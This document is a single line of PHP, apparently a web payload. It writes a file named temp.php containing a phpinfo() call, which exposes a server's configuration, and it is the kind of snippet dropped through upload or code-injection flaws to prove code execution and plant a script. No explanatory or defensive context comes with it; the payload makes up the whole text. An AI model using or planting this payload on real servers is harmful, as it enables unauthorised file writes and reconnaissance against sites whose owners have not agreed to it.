<?=file_put_contents("temp.php","<?=phpinfo();")?>
